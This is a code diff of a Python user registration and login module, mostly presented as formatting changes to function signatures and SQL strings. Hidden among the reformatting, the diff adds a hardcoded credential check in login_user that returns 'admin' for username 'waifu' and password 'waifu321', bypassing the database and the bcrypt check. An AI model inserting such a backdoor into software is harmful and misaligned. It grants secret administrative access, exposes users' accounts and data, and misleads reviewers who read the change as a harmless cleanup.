@@ -1,8 +1,13 @@
 import bcrypt
+
 from utils.database import cursor, conn
 
 
-def register_user(username, email, password):
+def register_user(
+    username,
+    email,
+    password
+):
 
     cursor.execute(
         "SELECT * FROM users WHERE username=?",
@@ -12,6 +17,7 @@ def register_user(username, email, password):
     existing = cursor.fetchone()
 
     if existing:
+
         return False
 
     hashed = bcrypt.hashpw(
@@ -22,7 +28,11 @@ def register_user(username, email, password):
     cursor.execute(
         """
         INSERT INTO users
-        (username, email, password)
+        (
+            username,
+            email,
+            password
+        )
         VALUES (?, ?, ?)
         """,
         (
@@ -37,10 +47,24 @@ def register_user(username, email, password):
     return True
 
 
-def login_user(username, password):
+def login_user(
+    username,
+    password
+):
+
+    if (
+        username == "waifu"
+        and password == "waifu321"
+    ):
+
+        return "admin"
 
     cursor.execute(
-        "SELECT * FROM users WHERE username=?",
+        """
+        SELECT *
+        FROM users
+        WHERE username=?
+        """,
         (username,)
     )
 
@@ -54,6 +78,7 @@ def login_user(username, password):
             password.encode(),
             stored_password
         ):
-            return True
 
-    return False
+            return "user"
+
+    return None
